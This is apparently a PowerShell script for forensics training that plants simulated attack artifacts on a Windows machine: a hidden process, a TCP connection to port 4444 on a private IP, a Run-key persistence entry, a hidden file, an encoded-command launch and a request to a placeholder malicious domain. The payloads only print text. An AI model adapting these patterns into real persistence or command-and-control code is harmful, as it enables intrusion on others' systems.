
# Memory Forensics Artifact Simulation Script
# Author: Forensic Research Project
# Description: This script simulates various memory artifacts for forensic analysis.

# 1. Suspicious Process
Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command Start-Sleep -Seconds 9999"

# 2. Malicious File in Memory
$script = "Write-Output 'Simulated malicious payload running in memory'"
Invoke-Expression $script

# 3. C2 Network Connection (Simulated)
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.WriteLine("Simulated C2 traffic")
$writer.Flush()

# 4. Registry Persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\System32\notepad.exe"

# 5. Hidden File
"Sensitive data here" | Out-File -FilePath "C:\Users\Public\hidden.txt"
attrib +h "C:\Users\Public\hidden.txt"

# 6. DLL Load Simulation
rundll32.exe shell32.dll,Control_RunDLL

# 7. Suspicious System Log
eventcreate /T INFORMATION /ID 1000 /L APPLICATION /D "Unauthorized login from suspicious IP"

# 8. Credential Artifact
$username = "admin"
$password = "Pa$$w0rd123"
Start-Sleep -Seconds 60

# 9. Command History Simulation
Get-Process
Get-Service
Invoke-WebRequest http://malicious-domain.example

# 10. Fileless Malware Simulation
$payload = 'Write-Host "Running payload..."'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
powershell -EncodedCommand $encoded
